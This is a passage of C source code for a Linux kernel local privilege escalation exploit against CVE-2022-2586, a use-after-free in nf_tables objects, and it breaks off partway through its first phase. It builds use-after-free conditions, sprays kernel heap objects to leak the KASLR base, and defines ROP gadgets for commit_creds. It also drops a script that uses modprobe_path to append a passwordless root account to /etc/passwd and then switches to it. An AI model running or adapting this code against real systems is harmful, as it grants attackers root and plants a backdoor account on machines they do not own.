/*
 * LPE N-day Exploit for CVE-2022-2586: Linux kernel nft_object UAF
 * gcc exploit.c -o exploit -lmnl -lnftnl -no-pie -lpthread
 * Author: Alejandro Guerrero <aguerrero@qualys.com>
 * Copyright (C) 2022 Qualys, Inc.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/ip.h>
#include <errno.h>
#include <sched.h>
#include <ctype.h>
#include <pthread.h>
#include <fcntl.h>
#include <unistd.h>
#include <stddef.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>
#include <linux/netfilter.h>
#include <libnftnl/chain.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <libnftnl/object.h>
#include <libnftnl/expr.h>
#include <libmnl/libmnl.h>
#include <linux/netfilter/nf_tables.h>

#define OFF_TO_OBJ_LST 184

#define TABLE_KLK_UAF_A "table1_klk"
#define TABLE_KLK_UAF_B "table2_klk"
#define SET_KLK_UAF "set1_klk"

#define TABLE_HLK_UAF_A "table1_hlk"
#define TABLE_HLK_UAF_B "table2_hlk"
#define TABLE_OBJ_SPRAY_A "table3_hlk"
#define SET_HLK_UAF "set1_hlk"

#define TABLE_RD_UAF_A "table1_rd"
#define TABLE_RD_UAF_B "table2_rd"
#define OBJ_RD_UAF "obj1_rd"
#define SET_RD_UAF "set1_rd"

#define TABLE_RP_UAF_A "table1_rp"
#define TABLE_RP_UAF_B "table2_rp"
#define OBJ_RP_UAF "obj1_rp"
#define SET_RP_UAF "set1_rp"
#define CHAIN_RP_UAF "chain1_rp"

#define DEFAULT_BASE 0xffffffff81000000

#define MAX_FDS 1024
#define OBJ_DEF_NAME 8

#define SINGLE_OPEN_OFF 0x37c890

#define MAX_SPRAY_TABLES 4096*3

#define TRIG_HOST "127.0.0.1"
#define TRIG_PORT 1337

#define UNSHARE_PATH "/bin/unshare"

#define DUMMY_MODPROBE_TRIGGER "/tmp/p"
#define CALLBACK_ROOT_SCRIPT "/tmp/x"

#define DEF_CORE 3

#define SA struct sockaddr

typedef enum {
	OBJECT_TYPE_UNKNOWN,
	OBJECT_TYPE_COUNTER,
	OBJECT_TYPE_LIMIT
} obj_t;

/* Function prototype definitions */
void launch_trigger(void);
void delete_table(char *);
void dummy_func(void);

/* Leaked addresses */
uint64_t tbl_leaked_addr = 0;
uint64_t obj_leaked_addr = 0;
uint64_t so_leaked_addr = 0;

/* KASLR base */
uint64_t kaslr_base = DEFAULT_BASE;

/* Addresses for functions or ROP gadgets */
uint64_t stack_pivot_addr = 0xffffffff817479b6; // push rdi ; pop rsp ; add cl, cl ; ret
uint64_t pop_rdi_ret = 0xffffffff810a06e0; // pop rdi ; ret
uint64_t xor_dh_dh_ret = 0xffffffff81537a39; // xor dh, dh ; ret
uint64_t mov_rdi_rax_jne_xor_eax_eax_ret = 0xffffffff815ee2f4; // mov rdi, rax ; jne 0xffffffff815ee2e1 ; xor eax, eax ; ret
uint64_t commit_creds = 0xffffffff810e1520; // commit_creds()
uint64_t prepare_kernel_cred = 0xffffffff810e1780; // prepare_kernel_cred()
uint64_t kpti_trampoline = 0xffffffff81e01006; // swapgs_restore_regs_and_return_to_usermode + 22
uint64_t pop_rdx_ret = 0xffffffff81022ab2; // pop rdx ; ret
uint64_t pop_rax_ret = 0xffffffff81046361; // pop rax ; ret
uint64_t mov_qptr_rdx_rax_ret = 0xffffffff8165aa85; // mov qword ptr [rdx], rax ; ret
uint64_t modprobe_path = 0xffffffff82e8a0e0; // modprobe_path

/* Saved userland registers */
uint64_t user_rip = (uint64_t)dummy_func;
uint64_t user_cs = 0;
uint64_t user_rflags = 0;
uint64_t user_sp = 0;
uint64_t user_ss = 0;

/* file descriptors for seq_operations spraying */
int fds[MAX_FDS] = { 0 };

int first_tbl_sp = 1;
char **tbl_ptr = NULL;

void dummy_func(void) {
	exit(0);
	return;
}

/* Exit printing a message before */
void bye(const char *msg) {
	if(msg != NULL)
		puts(msg);
	exit(1);
	return;
}

/* Launch the trigger and get root! */
void launch_trigger(void) {
	system(DUMMY_MODPROBE_TRIGGER " 2>/dev/null");
	system("su r00t");
	return;
}

/* Prepare dummy script and callback script */
void drop_callback_scripts(void) {
	system("bash -c \"echo -e '\xff\xff\xff\xff\xff\xff' > " DUMMY_MODPROBE_TRIGGER "\"");
	system("chmod +x " DUMMY_MODPROBE_TRIGGER);
	system("echo '#!/bin/bash' > " CALLBACK_ROOT_SCRIPT);
	system("echo 'echo \"r00t::0:0:r00t:/:/bin/sh\" >> /etc/passwd' >> " CALLBACK_ROOT_SCRIPT);
	system("chmod +x " CALLBACK_ROOT_SCRIPT);
	return;
}

/* Save initial userland registers */
void save_state(void) {
	__asm__(".intel_syntax noprefix;"
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	".att_syntax");
	return;
}

/* Hexdump utility for debugging purposes */
void hexdump(void *mem, unsigned int len) {
	unsigned int i = 0, j = 0;

	for(i = 0; i < len + ((len % 16) ? (16 - len % 16) : 0); i++) {
		if(i % 16 == 0)
			printf("0x%06x: ", i);

		if(i < len)
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		else
			printf("   ");

		if(i % 16 == (16 - 1)) {
			for(j = i - (16 - 1); j <= i; j++) {
				if(j >= len)
					putchar(' ');
				else if(isprint(((char*)mem)[j]))
					putchar(0xFF & ((char*)mem)[j]);
				else
					putchar('.');
			}
			putchar('\n');
		}
	}
	return;
}

/* Assign to a specific CPU core */
void assign_to_core(int core_id) {
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(core_id, &mask);
	if(sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
		bye("[-] Error at sched_setaffinity()");
	return;
}

/* Modify process rlimit for RLIMIT_NOFILE */
void modify_rlimit(void) {
	struct rlimit old_lim, lim, new_lim;
	
	if(getrlimit(RLIMIT_NOFILE, &old_lim) != 0)
		bye("[-] Error in getrlimit()");
		
	lim.rlim_cur = old_lim.rlim_max;
	lim.rlim_max = old_lim.rlim_max;

	if(setrlimit(RLIMIT_NOFILE, &lim) == -1)
		bye("[-] Error at setrlimit()");

	return;
}

/* Generate a random name */
char *generate_rnd_name(void) {
	char dict[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_";
	char *ptr = calloc(OBJ_DEF_NAME + 1, sizeof(char));
	
	if(!ptr)
		bye("[-] Error at calloc()");
	
	for(int i = 0 ; i < OBJ_DEF_NAME ; i++)
		ptr[i] = dict[rand() % strlen(dict)];
	
	return ptr;
}

/* Append a table to the list of sprayed ones */
void tbl_append_name(char *table_name) {
	int i = 0, s = 0;
	
	if(!tbl_ptr)
		bye("[-] tbl_ptr uninitialized");
	
	while(i < MAX_SPRAY_TABLES) {
		if(tbl_ptr[i] == NULL) {
			s = 1;
			tbl_ptr[i] = strdup(table_name);
			break;
		}
		i++;
	}
	
	if(!s)
		bye("[-] Value MAX_SPRAY_TABLES exceeded");

	return;
}

/* Cleanup all the tables we sprayed with */
void cleanup_spray_tables(void) {
	int i = 0;
	
	if(!tbl_ptr)
		bye("[-] tbl_ptr uninitialized");

	while(i < MAX_SPRAY_TABLES) {
		if(tbl_ptr[i] != NULL)
			delete_table(tbl_ptr[i]);
		i++;
	}
		
	return;
}

/* Spray with nla_memdup() allocations (arbitrary data and size) */
void spray_memdup(void *spray_data, size_t spray_size, size_t n) {
	struct mnl_socket *s = NULL;
	struct mnl_nlmsg_batch *batch = NULL;
	struct nlmsghdr *nh = NULL;
	int r = 0, seq = 0;
	char buf[16384] = { 0 };
	char *table_name = NULL;
	struct nftnl_table *table = NULL;
	size_t i = 0;
	
	assign_to_core(DEF_CORE);
	
	if(first_tbl_sp) {
		first_tbl_sp = 0;
		tbl_ptr = calloc(MAX_SPRAY_TABLES + 1, sizeof(char *));
		if(!tbl_ptr)
			bye("[-] Error at calloc()");
	}

	while(i < n) {
		table_name = generate_rnd_name();
		
		tbl_append_name(table_name);

		s = mnl_socket_open(NETLINK_NETFILTER);
		if(!s)
			bye("[-] Failed to create netfilter socket");
		
		batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
		nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);
		
		table = nftnl_table_alloc();
		nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
		nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, spray_data, spray_size);

		nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
		nftnl_table_nlmsg_build_payload(nh, table);
		mnl_nlmsg_batch_next(batch);
		
		nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);

		r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
		if(r < 0)
			bye("[-] Failed to send message");
		
		i++;
	}

	return;
}

/* Callback setelem get */
static int set_cb(const struct nlmsghdr *nlh, void *data) {
	struct nftnl_set *t;
	char buf[4096];
	uint32_t *type = data;

	t = nftnl_set_alloc();
	if (t == NULL) {
		perror("OOM");
		goto err;
	}

	if (nftnl_set_elems_nlmsg_parse(nlh, t) < 0) {
		perror("nftnl_set_nlmsg_parse");
		goto err_free;
	}

	nftnl_set_snprintf(buf, sizeof(buf), t, *type, 0);

err_free:
	nftnl_set_free(t);
err:
	return MNL_CB_OK;
}

/* Parse obj name retrieval output for pointer parsing */
uint64_t parse_uaf_obj_name_leak(char *table, char *set, off_t off, int p) {
	uint64_t ptr = 0;
	struct mnl_socket *nl = NULL;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh = NULL;
	uint32_t portid = 0, seq = 0;
	uint32_t type = NFTNL_OUTPUT_DEFAULT;
	struct nftnl_set *t = NULL;
	uint64_t *lk_p = NULL;
	int ret = 0;
	int i = 0;
	
	assign_to_core(DEF_CORE);
	
	t = nftnl_set_alloc();
	if(!t)
		bye("[-] Error at nftnl_set_alloc()");

	nlh = nftnl_set_nlmsg_build_hdr(buf, NFT_MSG_GETSETELEM, NFPROTO_IPV4, NLM_F_DUMP | NLM_F_ACK, seq++);
	nftnl_set_set(t, NFTNL_SET_NAME, set);
	nftnl_set_set(t, NFTNL_SET_TABLE, table);
	nftnl_set_elems_nlmsg_build_payload(nlh, t);

	nl = mnl_socket_open(NETLINK_NETFILTER);
	if(!nl)
		bye("[-] Error at mnl_socket_open()");

	if(mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
		bye("[-] Error at mnl_socket_bind()");
		
	portid = mnl_socket_get_portid(nl);

	if(mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
		bye("[-] Error at mnl_socket_sendto()");

	ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	while (ret > 0) {
		ret = mnl_cb_run(buf, ret, seq, portid, set_cb, &type);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
	}
	
	//hexdump(buf, 512);
	
	if(p) {
		while(i < 512) {
			if(buf[i] == '\xff' && buf[i+1] == '\xff') {
				if(i <= 6)
					bye("[-] Unknown data");
				//puts("B");
				lk_p = (uint64_t *)((buf + i)-6);
				//printf("debug 0x%lx\n", *lk_p);
				return *lk_p;
			}
			i++;
		}
	}
	
	lk_p = (uint64_t *)(buf + off);
	
	mnl_socket_close(nl);
	
	return *lk_p;
}

/* Spray with nft_object allocations */
uint64_t spray_nft_object(char *table_name, size_t n, char *l_table_name, char *l_set_name) {
	struct mnl_socket *s = NULL;
	struct mnl_nlmsg_batch *batch = NULL;
	struct nlmsghdr *nh = NULL;
	int r = 0, seq = 0;
	char buf[16384] = { 0 };
	char *obj_name = NULL;
	struct nftnl_obj *obj = NULL;
	size_t i = 0;
	uint64_t leaked_addr = 0;
	
	assign_to_core(DEF_CORE);
	
	while(i < n) {
		
		s = mnl_socket_open(NETLINK_NETFILTER);
		if(!s)
			bye("[-] Failed to create netfilter socket");
		
		seq = 0;
		memset(buf, 0, sizeof(buf));
			
		batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
		nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);
		
		obj_name = generate_rnd_name();
		
		obj = nftnl_obj_alloc();
		nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
		nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table_name);
		nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
		nftnl_obj_set_u64(obj, NFTNL_OBJ_CTR_BYTES, 0);
		
		printf("\t[i] Creating NFT_OBJECT_COUNTER object '%s'...\n", obj_name);
		
		nh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_CREATE, seq++);
		nftnl_obj_nlmsg_build_payload(nh, obj);
		mnl_nlmsg_batch_next(batch);
		
		nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
		mnl_nlmsg_batch_next(batch);

		r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
		if(r < 0)
			bye("[-] Failed to send message");
			
		usleep(1400000);
		
		leaked_addr = parse_uaf_obj_name_leak(l_table_name, l_set_name, 0x40 + 12, 0);
		//printf("0x%lx\n", leaked_addr);
		if(leaked_addr != 0 && ((leaked_addr & 0xffff000000000000) == 0xffff000000000000))
			break;
	
		i++;
	}
	
	return leaked_addr;
}

/* Delete a netfilter table */
void delete_table(char *table_name) {
	struct mnl_socket *s = NULL;
	struct mnl_nlmsg_batch *batch = NULL;
	struct nlmsghdr *nh = NULL;
	int r = 0;
	int seq = 0;
	char buf[16384] = { 0 };
	struct nftnl_table *table = NULL;
	
	assign_to_core(DEF_CORE);
	
	s = mnl_socket_open(NETLINK_NETFILTER);
	if(!s)
		bye("[-] Failed to create netfilter socket");

	table = nftnl_table_alloc();
	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
	
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_table_nlmsg_build_payload(nh, table);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);
	
	r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
	if(r < 0)
		bye("[-] Failed to send message");
	
	return;
}

/* Pause function for debugging purposes */
void pause_x(void) {
	char c = 0;
	int r = 0;
	puts("[i] Press any key to continue...");
	r = read(0, &c, sizeof(char));
	if(r < 0)
		bye("[-] Error from pause_x()");
	return;
}

/* Repeat a char n times and return a string */
char *str_repeat(char c, size_t n) {
	char *ptr = calloc(n + 1, sizeof(char));
	if(!ptr)
		bye("[-] Error at calloc()");
	
	for(int i = 0 ; i < n ; i++)
		ptr[i] = c;
	
	return ptr;
}

/* Create a netfilter table */
void create_table(char *table_name) {
	struct mnl_socket *s = NULL;
	struct mnl_nlmsg_batch *batch = NULL;
	struct nlmsghdr *nh = NULL;
	int r = 0;
	int seq = 0;
	char buf[16384] = { 0 };
	struct nftnl_table *table = NULL;
	
	table = nftnl_table_alloc();
	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

	s = mnl_socket_open(NETLINK_NETFILTER);
	if(!s)
		bye("[-] Failed to create netfilter socket");

	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_table_nlmsg_build_payload(nh, table);
	mnl_nlmsg_batch_next(batch);
	
	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
	if(r < 0)
		bye("[-] Failed to send message");
	
		
	return;
}

/* Prepare a UAF condition by cross-referencing an object from one table to another */
void create_uaf(char *table_1, char *table_2, char *obj_n, char *set_n, obj_t obj_type, int is_s_trick, char *s_trick_name, int x) {
	struct mnl_socket *s = NULL;
	struct mnl_nlmsg_batch *batch = NULL;
	struct nlmsghdr *nh = NULL;
	int r = 0;
	int seq = 0;
	uint16_t klen[64] = { 1 };
	char buf[16384] = { 0 };
	struct nftnl_table *table = NULL;
	struct nftnl_table *table2 = NULL;
	struct nftnl_table *table3 = NULL;
	struct nftnl_set_elem *slem = NULL;
	struct nftnl_obj *obj = NULL;
	struct nftnl_set *sx = NULL;
	struct nftnl_set *set = NULL;
	struct nftnl_chain *chain = NULL;
	
	if(obj_type == OBJECT_TYPE_UNKNOWN)
		bye("[-] Unknown object type");

	s = mnl_socket_open(NETLINK_NETFILTER);
	if(!s)
		bye("[-] Failed to create netfilter socket");

	
	table = nftnl_table_alloc();
	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_1);

	table2 = nftnl_table_alloc();
	nftnl_table_set_str(table2, NFTNL_TABLE_NAME, table_2);
	
	if(is_s_trick) {
		table3 = nftnl_table_alloc();
		nftnl_table_set_str(table3, NFTNL_TABLE_NAME, s_trick_name);
	}
	
	obj = nftnl_obj_alloc();
	nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_n);
	nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table_1);
	
	if(x) {
		chain = nftnl_chain_alloc();
		nftnl_chain_set(chain, NFTNL_CHAIN_NAME, CHAIN_RP_UAF);
		nftnl_chain_set(chain, NFTNL_CHAIN_TABLE, table_2);
		nftnl_chain_set_data(chain, NFTNL_CHAIN_TYPE, strdup("filter"), 0);
		nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_OUT);
		nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 0);
	}
	
	if(obj_type == OBJECT_TYPE_LIMIT) {
		nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_LIMIT);
		nftnl_obj_set_u64(obj, NFTNL_OBJ_LIMIT_RATE, 1); 
		nftnl_obj_set_u64(obj, NFTNL_OBJ_LIMIT_UNIT, 1);
	} else if(obj_type == OBJECT_TYPE_COUNTER) {
		nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
		nftnl_obj_set_u64(obj, NFTNL_OBJ_CTR_BYTES, 0);
	} else
		bye("[-] Unknown object type");

	set = nftnl_set_alloc();
	nftnl_set_set_str(set, NFTNL_SET_NAME, set_n);
	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_2);
	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, NFPROTO_IPV4);
	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, sizeof(uint16_t));
	nftnl_set_set_u32(set, NFTNL_SET_KEY_TYPE, 13);
	nftnl_set_set_u32(set, NFTNL_SET_ID, htonl(0xcafe));
	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_OBJECT); // NFT_SET_ANONYMOUS
	
	if(obj_type == OBJECT_TYPE_LIMIT)
		nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, NFT_OBJECT_LIMIT);
	else if(obj_type == OBJECT_TYPE_COUNTER)
		nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, NFT_OBJECT_COUNTER);
	else
		bye("[-] Unknown object type");

	sx = nftnl_set_alloc();
	nftnl_set_set_str(sx, NFTNL_SET_TABLE, table_1);
	nftnl_set_set_u32(sx, NFTNL_SET_ID, htonl(0xcafe));
	
	klen[0] = htons(TRIG_PORT);
	
	slem = nftnl_set_elem_alloc();
	nftnl_set_elem_set(slem, NFTNL_SET_ELEM_KEY, &klen, sizeof(uint16_t));
	nftnl_set_elem_set_str(slem, NFTNL_SET_ELEM_OBJREF, obj_n);
	nftnl_set_elem_add(sx, slem);
	
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_table_nlmsg_build_payload(nh, table);
	mnl_nlmsg_batch_next(batch);

	nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_table_nlmsg_build_payload(nh, table2);
	mnl_nlmsg_batch_next(batch);
	
	if(is_s_trick) {
		nh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, seq++);
		nftnl_table_nlmsg_build_payload(nh, table3);
		mnl_nlmsg_batch_next(batch);
	}
	
	nh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_obj_nlmsg_build_payload(nh, obj);
	mnl_nlmsg_batch_next(batch);
	
	if(x) {
		nh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, NFPROTO_IPV4, NLM_F_CREATE, seq++);
		nftnl_chain_nlmsg_build_payload(nh, chain);
		mnl_nlmsg_batch_next(batch);
	}
	
	nh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_set_nlmsg_build_payload(nh, set);
	mnl_nlmsg_batch_next(batch);
	
	nh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, seq++);
	nftnl_set_elems_nlmsg_build_payload(nh, sx);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	r = mnl_socket_sendto(s, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch));
	if(r < 0)
		bye("[-] Failed to send message");
	return;
}

/* Once having KASLR base, recalculate offsets */
void recalculate_from_kaslr_base(void) {
	uint64_t k_diff = kaslr_base - DEFAULT_BASE;
	commit_creds += k_diff;
	prepare_kernel_cred += k_diff;
	mov_rdi_rax_jne_xor_eax_eax_ret += k_diff;
	pop_rdi_ret += k_diff;
	xor_dh_dh_ret += k_diff;
	stack_pivot_addr += k_diff;
	kpti_trampoline += k_diff;
	modprobe_path += k_diff;
	pop_rdx_ret += k_diff;
	pop_rax_ret += k_diff;
	mov_qptr_rdx_rax_ret += k_diff;
	return;
}

/* Set up a hook for output packets using a set with key destination port and value a referenced counter */
void set_up_hook(char *table, char *set, char *chain) {
	char *cmd = NULL;
	asprintf(&cmd, "nft add rule %s %s counter name tcp dport map @%s", table, chain, set);
	system(cmd);
	return;
}

/* Connect to a server in a specific port to trigger netfilter hooks */
void trig_net_sock(void) {
	int sockfd = 0, connfd = 0;
	struct sockaddr_in servaddr, cli;
	
	bzero(&servaddr, sizeof(servaddr));
	bzero(&cli, sizeof(cli));
	
	printf("\t[*] Connecting to 127.0.0.1:%d...\n", TRIG_PORT);
	
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sockfd == -1)
		bye("[-] Socket creation failed");

	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr(TRIG_HOST);
	servaddr.sin_port = htons(TRIG_PORT);

	if(connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0)
		bye("[-] Connection with server failed");

	write(sockfd, "AAAA", 4);
	
	close(sockfd);
	
	return;
}

/* Spray with seq_operations structs */
void spray_seq_op_loop(void) {
	int fds[MAX_FDS] = { 0 };
	int i = 0;
	
	assign_to_core(DEF_CORE);
	
	modify_rlimit();
	
	while(i < MAX_FDS) {
		fds[i] = open("/proc/self/stat", O_RDONLY);
		i++;
	}
	return;
}

/* Set up a server to receive hook-triggering output packets */
void setup_trig_server(void) {
	int sfd = 0, sock = 0, r = 0;
	struct sockaddr_in address;
	int opt = 1;
	int addrlen = sizeof(address);
	char buffer[1024] = { 0 };

	if((sfd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
		bye("[-] Error at socket()");

	if(setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
		bye("[-] Error at setsockopt()");

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(TRIG_PORT);

	if(bind(sfd, (struct sockaddr*)&address,  sizeof(address)) < 0)
		bye("[-] Error at bind()");

	if(listen(sfd, 3) < 0)
		bye("[-] Error at listen()");

	if((sock = accept(sfd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0)
		bye("[-] Error at accept()");

	r = read(sock, buffer, 4);

	sleep(3);

	close(sock);
	close(sfd);

	return;
}

int main(int argc, char *argv[]) {
	struct mnl_socket *s = NULL;
	struct mnl_nlmsg_batch *batch = NULL;
	struct nlmsghdr *nh = NULL;
	int r = 0, seq = 0;
	uint16_t klen[64] = { 1 };
	char buf[16384] = { 0 };
	char *klk_obj_name = NULL;
	char *hlk_obj_name = NULL;
	char *sp_d = NULL;
	uint64_t *sp_d_l = NULL;
	char *sp2_d = NULL;
	uint64_t *sp2_d_l = NULL;
	char *rop_d = NULL;
	uint64_t *rop_d_l = NULL;
	size_t klk_tries = 0;
	pthread_t tx;
	void *retval = NULL;
	int pid = 0;
	int fd = 0;
	int pipefd[2] = { 0 };
	int sfd = 0, cfd = 0;
	int is_success = 0;
	char *pipefd_str = NULL;
	
	if(geteuid() == 0)
		goto EXP_P;
		
	pipe(pipefd);
	
	/* 
	   Drop callback scripts to achieve LPE from modprobe usermode
	   helper execution
	*/
	drop_callback_scripts();
	
	/*
	   Launch the process that will pop the root shell: it needs
	   to be outside of the namespace
	*/
	pid = fork();
	if(pid == 0) {
		close(pipefd[1]);

		r = read(pipefd[0], &is_success, sizeof(int));
		if(r < 0)
			bye("[-] Exploit failed!");
		
		sleep(2);
		
		if(is_success)
			launch_trigger();
		exit(0);
	}
	
	close(pipefd[0]);
	
	asprintf(&pipefd_str, "%d", pipefd[1]);
	
	//unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

	/*
	   Execute ourselves in a new network namespace to
	   be able to trigger and exploit the bug
	*/
	char *args[] = {
		UNSHARE_PATH, "-Urnm", argv[0], pipefd_str,
		NULL,
	};
	execvp(UNSHARE_PATH, args);

EXP_P:
	if(argc != 2)
		bye("[-] pipe fd not provided for namespace process");
	
	pipefd[1] = atoi(argv[1]);

	/* Assign to a specific CPU core for heap shaping reliability */
	assign_to_core(DEF_CORE);
	
	srand(time(NULL));
	
	puts("[*] Saving current state...");
	save_state();
	
	/* ===================== [  Pre-cleanup ] ===================== */
	
	/* Remove exploit tables left from other executions */
	
	delete_table(TABLE_KLK_UAF_A);
	delete_table(TABLE_KLK_UAF_B);
	
	delete_table(TABLE_HLK_UAF_A);
	delete_table(TABLE_HLK_UAF_B);
	delete_table(TABLE_OBJ_SPRAY_A);
	
	delete_table(TABLE_RD_UAF_A);
	delete_table(TABLE_RD_UAF_B);
	
	delete_table(TABLE_RP_UAF_A);
	delete_table(TABLE_RP_UAF_B);
	
	/* ===================== [ Pre-Alloc ] ===================== */
	
	/*
	    As a result of the table spraying, adding the traversing to add
	    the hooking rule will turn slow, we create the objects for the
	    last stage at the very beggining of the exploit.
	*/
	
	create_uaf(TABLE_RP_UAF_A, TABLE_RP_UAF_B, OBJ_RP_UAF, SET_RP_UAF, OBJECT_TYPE_COUNTER, 0, NULL, 1);
	set_up_hook(TABLE_RP_UAF_B, SET_RP_UAF, CHAIN_RP_UAF);
	
	/* ===================== [ Phase 1 - KASLR Leak ] ===================== */
	
	puts("[i] Phase 1 - KASLR leak");

PHASE_1:
	puts("\t[*] Triggering UAF on nft_object struct...");
	klk_obj_name = str_repeat('X', 0x20 - 2);
	create_uaf(TABLE_KLK_UAF_A, TABLE_KLK_UAF_B, klk_obj_name, SET_KLK_UAF, OBJECT_TYPE_COUNTER, 0, NULL, 0);
	
	/*
	   Right at the time we remove the table that holds the referenced object,
	   we need to start spraying with seq_operations struct to succeed in
	   leaking single_open() address, and calculating KASLR base this way.
	*/

	pthread_create(&tx, NULL, (void *)spray_seq_op_loop, NULL);
	
	delete_table(TABLE_KLK_UAF_A);
	puts("\t[*] Spraying with seq_operations structs...");

	pthread_join(tx, &retval);
	
	/*
